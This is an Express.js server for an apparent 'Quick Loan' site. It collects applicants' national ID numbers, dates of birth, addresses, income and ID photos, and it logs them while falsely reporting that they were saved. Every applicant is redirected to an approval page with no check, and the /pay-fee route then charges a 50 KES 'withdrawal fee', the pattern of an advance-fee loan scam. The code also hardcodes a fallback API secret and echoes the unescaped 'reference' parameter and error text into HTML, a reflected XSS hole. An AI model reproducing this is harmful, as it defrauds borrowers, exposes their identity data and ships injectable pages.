const express = require("express");
const path = require("path");
const multer = require("multer");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 3000;

const PAVEWAY_SECRET = process.env.PAVEWAY_SECRET || "5fa4a79b5d0e66f49ceb1f17ed8a7584db0908fd7133ba48bee7d7106a40a579";
const PAVEWAY_BASE = process.env.PAVEWAY_BASE || "https://paywavexpress.co.ke";
const BASE_URL = process.env.BASE_URL || `http://localhost:${PORT}`;

const storage = multer.memoryStorage();
const upload = multer({
    storage: storage,
    limits: { fileSize: 5 * 1024 * 1024 },
    fileFilter: (req, file, cb) => {
        const allowedTypes = ['image/jpeg', 'image/png', 'image/jpg', 'image/gif'];
        if (allowedTypes.includes(file.mimetype)) {
            cb(null, true);
        } else {
            cb(new Error('Only JPEG, PNG, JPG, and GIF images are allowed'));
        }
    }
});

app.use(express.static(__dirname));
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

app.post("/submit-application", upload.single("idPhoto"), (req, res) => {
    try {
        const {
            fullName,
            email,
            phone,
            idNumber,
            dob,
            address,
            employment,
            income,
            loanAmount,
            purpose,
            notes
        } = req.body;

        let photoBase64 = null;
        let photoSize = 0;
        let photoType = null;

        if (req.file) {
            photoBase64 = req.file.buffer.toString('base64');
            photoSize = req.file.size;
            photoType = req.file.mimetype;
            console.log(`📸 ID Photo uploaded: ${photoSize} bytes, ${photoType}`);
        } else {
            console.log(`📸 No ID photo uploaded`);
        }

        console.log("\n" + "=".repeat(50));
        console.log("📋 NEW LOAN APPLICATION");
        console.log("=".repeat(50));
        console.log(`👤 Full Name: ${fullName || "Not provided"}`);
        console.log(`📧 Email: ${email || "Not provided"}`);
        console.log(`📱 Phone: ${phone || "Not provided"}`);
        console.log(`🪪 ID Number: ${idNumber || "Not provided"}`);
        console.log(`📅 Date of Birth: ${dob || "Not provided"}`);
        console.log(`📍 Address: ${address || "Not provided"}`);
        console.log(`💼 Employment: ${employment || "Not provided"}`);
        console.log(`💰 Monthly Income: ${income || "Not provided"} KES`);
        console.log(`💵 Loan Amount: ${loanAmount || "Not provided"} KES`);
        console.log(`🎯 Purpose: ${purpose || "Not provided"}`);
        console.log(`📝 Notes: ${notes || "None"}`);
        console.log(`🖼️ ID Photo: ${photoBase64 ? "Uploaded ✅" : "Not uploaded ❌"}`);
        console.log("=".repeat(50));
        console.log("✅ Application saved successfully\n");

        res.redirect(`/approved.html?email=${encodeURIComponent(email || "")}&phone=${encodeURIComponent(phone || "")}`);

    } catch (error) {
        console.error("❌ Error processing application:", error);
        res.status(500).send("Error processing your application. Please try again.");
    }
});

app.get("/pay-fee", async (req, res) => {
    const { email, phone } = req.query;

    if (!email || !email.includes('@')) {
        return res.status(400).send(`
            <h2>❌ Email Required</h2>
            <p>Please provide a valid email address to proceed with payment.</p>
            <a href="/">Go Back</a>
        `);
    }

    console.log(`\n💳 Initiating payment for:`);
    console.log(`   📧 Email: ${email}`);
    console.log(`   📱 Phone: ${phone || "Not provided"}`);
    console.log(`   💰 Amount: 50 KSH`);

    const paymentData = {
        amount: 50,
        currency: "KES",
        email: email,
        phone: phone || "0712345678",
        callback_url: `${BASE_URL}/payment-callback`,
        description: "Quick Loan - Withdrawal Fee",
        metadata: {
            loan_type: "Quick Loan",
            fee_type: "Withdrawal processing fee"
        }
    };

    const endpoints = [
        `${PAVEWAY_BASE}/api/initiate-payment`,
        `${PAVEWAY_BASE}/api/payment/initiate`,
        `${PAVEWAY_BASE}/payment/initiate`,
        `${PAVEWAY_BASE}/initiate-payment`,
        `${PAVEWAY_BASE}/api/v1/initiate-payment`,
        `${PAVEWAY_BASE}/api/transaction/initiate`,
    ];

    let lastError = null;

    for (const endpoint of endpoints) {
        try {
            console.log(`🔄 Trying endpoint: ${endpoint}`);

            const response = await fetch(endpoint, {
                method: "POST",
                headers: {
                    "Authorization": `Bearer ${PAVEWAY_SECRET}`,
                    "Content-Type": "application/json",
                    "Accept": "application/json"
                },
                body: JSON.stringify(paymentData),
            });

            const data = await response.json();
            console.log(`📦 Response from Pave Way:`, JSON.stringify(data, null, 2));

            const paymentUrl = data.payment_url || 
                              data.redirect_url || 
                              data.url || 
                              data.data?.payment_url ||
                              data.data?.redirect_url ||
                              data.authorization_url ||
                              data.checkout_url;

            if (paymentUrl) {
                console.log(`✅ Success! Redirecting to: ${paymentUrl}`);
                return res.redirect(paymentUrl);
            }

            if (data.status === "success" || data.success === true || data.code === "00") {
                console.log(`⚠️ Success response but no payment URL found.`);
                return res.status(500).send(`
                    <h2>⚠️ Payment Initiated</h2>
                    <p>Payment was initiated but no redirect URL was returned.</p>
                    <p>Please check your Pave Way dashboard for the transaction.</p>
                    <a href="/">Go Back</a>
                `);
            }

            lastError = data.message || data.error || data.status_message || "Unknown error";

        } catch (error) {
            console.log(`❌ Failed endpoint: ${endpoint}`);
            console.log(`   Error: ${error.message}`);
            lastError = error.message;
        }
    }

    console.log(`❌ All payment endpoints failed.`);
    console.log(`   Last error: ${lastError}`);

    res.status(500).send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Payment Error</title>
            <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
            <style>
                body { 
                    background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
                    min-height: 100vh;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    font-family: 'Inter', sans-serif;
                }
                .error-card {
                    background: rgba(255,255,255,0.96);
                    border-radius: 30px;
                    padding: 40px;
                    max-width: 500px;
                    width: 100%;
                    text-align: center;
                    box-shadow: 0 30px 60px rgba(0,0,0,0.5);
                }
                .error-icon { font-size: 60px; color: #dc3545; }
                .btn-custom {
                    background: linear-gradient(135deg, #667eea, #764ba2);
                    color: white;
                    padding: 12px 30px;
                    border: none;
                    border-radius: 12px;
                    text-decoration: none;
                    display: inline-block;
                    margin-top: 15px;
                }
                .btn-custom:hover { color: white; transform: translateY(-2px); }
            </style>
        </head>
        <body>
            <div class="error-card">
                <div class="error-icon">❌</div>
                <h2>Payment Error</h2>
                <p class="text-muted">We couldn't initiate your payment. Please try again or contact support.</p>
                <div class="alert alert-danger text-start small">
                    <strong>Error details:</strong><br>
                    ${lastError || "Unknown error"}
                </div>
                <a href="/" class="btn-custom">Try Again</a>
            </div>
        </body>
        </html>
    `);
});

app.get("/payment-callback", async (req, res) => {
    console.log("\n🔔 Payment callback received!");
    console.log("📥 Query parameters:", req.query);

    const reference = req.query.reference || 
                      req.query.transaction_id || 
                      req.query.trxref || 
                      req.query.payment_id ||
                      req.query.id ||
                      req.query.ref;

    if (!reference) {
        console.log("❌ No transaction reference found in callback.");
        return res.status(400).send(`
            <h2>❌ Missing Transaction Reference</h2>
            <p>No payment reference was provided in the callback.</p>
            <a href="/">Go Home</a>
        `);
    }

    console.log(`🔑 Transaction Reference: ${reference}`);

    const verifyEndpoints = [
        `${PAVEWAY_BASE}/api/verify-payment/${reference}`,
        `${PAVEWAY_BASE}/api/payment/verify/${reference}`,
        `${PAVEWAY_BASE}/payment/verify/${reference}`,
        `${PAVEWAY_BASE}/verify-payment/${reference}`,
        `${PAVEWAY_BASE}/api/v1/verify-payment/${reference}`,
        `${PAVEWAY_BASE}/api/transaction/verify/${reference}`,
    ];

    for (const endpoint of verifyEndpoints) {
        try {
            console.log(`🔍 Verifying at: ${endpoint}`);

            const response = await fetch(endpoint, {
                method: "GET",
                headers: {
                    "Authorization": `Bearer ${PAVEWAY_SECRET}`,
                    "Accept": "application/json"
                }
            });

            const data = await response.json();
            console.log(`📦 Verification response:`, JSON.stringify(data, null, 2));

            const isSuccessful = data.status === "success" ||
                                data.success === true ||
                                data.payment_status === "completed" ||
                                data.status === "completed" ||
                                data.data?.status === "success" ||
                                data.data?.payment_status === "completed" ||
                                data.code === "00" ||
                                data.verified === true;

            if (isSuccessful) {
                console.log(`✅ Payment verified successfully! Reference: ${reference}`);
                return res.sendFile(path.join(__dirname, "success.html"));
            }

            if (data.status === "failed" || data.status === "pending" || data.payment_status === "failed") {
                console.log(`⚠️ Payment status: ${data.status || data.payment_status}`);
                return res.status(400).send(`
                    <h2>⏳ Payment ${data.status || "Pending"}</h2>
                    <p>Your payment is ${data.status || "still being processed"}.</p>
                    <p>Please check your email for confirmation.</p>
                    <a href="/">Go Home</a>
                `);
            }

        } catch (error) {
            console.log(`❌ Verify failed for ${endpoint}: ${error.message}`);
        }
    }

    console.log(`❌ Payment verification failed for reference: ${reference}`);
    res.status(400).send(`
        <h2>❌ Verification Failed</h2>
        <p>We couldn't verify your payment. Please contact support.</p>
        <p>Transaction Reference: ${reference}</p>
        <a href="/">Go Home</a>
    `);
});

app.post("/status", (req, res) => {
    res.sendFile(path.join(__dirname, "status.html"));
});

app.listen(PORT, () => {
    console.log("\n" + "=".repeat(50));
    console.log("🚀 QUICK LOAN SERVER");
    console.log("=".repeat(50));
    console.log(`✅ Server running on: ${BASE_URL}`);
    console.log(`🔗 Payment Gateway: ${PAVEWAY_BASE}`);
    console.log("=".repeat(50));
    console.log("\n💡 Visit: " + BASE_URL);
    console.log("📋 Fill the form to apply for a loan\n");
});
